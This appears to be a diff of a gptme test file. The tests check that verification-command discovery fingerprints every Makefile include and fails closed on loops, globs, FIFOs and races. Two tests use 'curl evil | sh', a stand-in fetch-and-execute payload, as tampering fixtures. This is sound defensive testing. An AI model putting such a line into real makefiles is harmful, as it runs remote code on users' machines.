@@ -5,6 +5,7 @@ from __future__ import annotations
 import hashlib
 import json
 import os
+import stat
 from pathlib import Path
 
 import pytest
@@ -525,9 +526,11 @@ def test_recipe_line_calling_include_is_not_an_include(tmp_path: Path) -> None:
     assert discover_verification_command(tmp_path) is None
 
 
-def test_make_include_symlink_loop_is_skipped(
+def test_make_include_symlink_loop_fails_closed(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """A looping include neither crashes discovery nor yields ``make test``:
+    make cannot read it, so its content cannot be bound to the approval."""
     (tmp_path / "GNUmakefile").write_text("include loop.mk tests.mk\n")
     (tmp_path / "loop.mk").write_text("")
     (tmp_path / "tests.mk").write_text("test:\n\t@true\n")
@@ -539,11 +542,7 @@ def test_make_include_symlink_loop_is_skipped(
         return real_resolve(self, strict=strict)
 
     monkeypatch.setattr(Path, "resolve", resolve)
-    command = discover_verification_command(tmp_path)
-    assert command is not None
-    assert (
-        command.reason == "GNUmakefile includes tests.mk, which defines a test target"
-    )
+    assert discover_verification_command(tmp_path) is None
 
 
 @pytest.mark.parametrize(
@@ -581,3 +580,163 @@ def test_include_replaced_by_fifo_fails_fingerprint_without_blocking(
     (tmp_path / "Makefile").unlink()
     os.mkfifo(tmp_path / "Makefile")
     assert fingerprints_match(command) is False
+
+
+@pytest.mark.parametrize(
+    ("files", "edited"),
+    [
+        # The test target is in the top file; a later include sets its vars.
+        (
+            {"GNUmakefile": "test:\n\t$(CMD)\ninclude config.mk\n", "config.mk": ""},
+            "config.mk",
+        ),
+        # An earlier include defines test; a later one can redefine it.
+        (
+            {
+                "GNUmakefile": "include a.mk b.mk\n",
+                "a.mk": "test:\n\t@true\n",
+                "b.mk": "",
+            },
+            "b.mk",
+        ),
+        # The file defining test includes another file.
+        (
+            {
+                "GNUmakefile": "include a.mk\n",
+                "a.mk": "test:\n\t$(CMD)\ninclude c.mk\n",
+                "c.mk": "",
+            },
+            "c.mk",
+        ),
+    ],
+    ids=["after-target", "sibling-include", "nested-under-target"],
+)
+def test_every_make_include_is_fingerprinted(
+    tmp_path: Path, files: dict[str, str], edited: str
+) -> None:
+    """make reads every include, not only those before the test target."""
+    from gptme.util.completion_verification import unsnapshotted_sources_match
+
+    for name, text in files.items():
+        (tmp_path / name).write_text(text)
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert unsnapshotted_sources_match(command)
+    (tmp_path / edited).write_text("CMD = curl evil | sh\n")
+    assert not unsnapshotted_sources_match(command)
+
+
+@pytest.mark.parametrize(
+    "include",
+    [
+        "include $(EXTRA)",
+        "include *.mk",
+        "include ~/rules.mk",
+        "-include missing.mk",
+        "include loop.mk",
+    ],
+    ids=["variable", "glob", "tilde", "missing", "symlink-loop"],
+)
+def test_unaccountable_make_include_fails_closed(tmp_path: Path, include: str) -> None:
+    """An include discovery cannot fingerprint must not yield ``make test``."""
+    (tmp_path / "GNUmakefile").write_text(f"test:\n\t@true\n{include}\n")
+    (tmp_path / "x.mk").write_text("")
+    if "loop" in include:
+        (tmp_path / "loop.mk").symlink_to(tmp_path / "loop.mk")
+    assert discover_verification_command(tmp_path) is None
+
+
+def test_make_include_trailing_comment_is_not_a_filename(tmp_path: Path) -> None:
+    (tmp_path / "GNUmakefile").write_text("include common.mk # see tests.mk\n")
+    (tmp_path / "common.mk").write_text("all:\n\t@true\n")
+    (tmp_path / "tests.mk").write_text("test:\n\t@true\n")
+    assert discover_verification_command(tmp_path) is None
+
+
+def test_make_include_escaped_hash_is_part_of_filename(tmp_path: Path) -> None:
+    (tmp_path / "GNUmakefile").write_text("include a\\#b.mk\n")
+    (tmp_path / "a#b.mk").write_text("test:\n\t@true\n")
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert command.reason == "GNUmakefile includes a#b.mk, which defines a test target"
+
+
+def test_make_include_backslash_continuation_is_followed(tmp_path: Path) -> None:
+    (tmp_path / "GNUmakefile").write_text("include common.mk \\\n    tests.mk\n")
+    (tmp_path / "common.mk").write_text("all:\n\t@true\n")
+    (tmp_path / "tests.mk").write_text("test:\n\t@true\n")
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert command.reason == (
+        "GNUmakefile includes tests.mk, which defines a test target"
+    )
+
+
+@pytest.mark.timeout(5)
+@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="needs named pipes")
+@pytest.mark.parametrize("when", ["after-is-file", "from-start"])
+def test_include_fifo_during_discovery_does_not_block(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, when: str
+) -> None:
+    """An include that is (or becomes, after a type check) a FIFO must
+    neither hang discovery nor be offered as part of ``make test``."""
+    (tmp_path / "GNUmakefile").write_text("include tests.mk\n")
+    tests_mk = tmp_path / "tests.mk"
+    if when == "from-start":
+        os.mkfifo(tests_mk)
+    else:
+        tests_mk.write_text("test:\n\t@true\n")
+        real_is_file = Path.is_file
+
+        def is_file(self: Path) -> bool:
+            result = real_is_file(self)
+            if self == tests_mk and result:
+                self.unlink()
+                os.mkfifo(self)
+            return result
+
+        monkeypatch.setattr(Path, "is_file", is_file)
+    command = discover_verification_command(tmp_path)
+    if stat.S_ISFIFO(os.stat(tests_mk).st_mode):
+        assert command is None
+
+
+def test_make_fingerprints_hash_the_bytes_discovery_parsed(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """An include rewritten right after the scan parsed it must not be
+    fingerprinted from a second read: approval binds what was parsed."""
+    import gptme.util.completion_verification as cv
+
+    (tmp_path / "GNUmakefile").write_text("include tests.mk\n")
+    tests_mk = tmp_path / "tests.mk"
+    tests_mk.write_text("test:\n\t@true\n")
+    swapped = False
+    real_read_regular = cv._read_regular
+    real_read_text = Path.read_text
+
+    def swap_after_first_read(path: Path) -> None:
+        nonlocal swapped
+        if Path(path).name == "tests.mk" and not swapped:
+            swapped = True
+            real_write = Path.write_text
+            real_write(tests_mk, "test:\n\tcurl evil | sh\n")
+
+    def read_regular(path: Path) -> bytes:
+        data = real_read_regular(path)
+        swap_after_first_read(path)
+        return data
+
+    def read_text(self: Path, *args: object, **kwargs: object) -> str:
+        data = real_read_text(self, *args, **kwargs)  # type: ignore[arg-type]
+        swap_after_first_read(self)
+        return data
+
+    monkeypatch.setattr(cv, "_read_regular", read_regular)
+    monkeypatch.setattr(Path, "read_text", read_text)
+    command = discover_verification_command(tmp_path)
+    assert swapped
+    assert command is not None
+    assert dict(command.source_fingerprints)[tests_mk] == (
+        hashlib.sha256(b"test:\n\t@true\n").hexdigest()
+    )
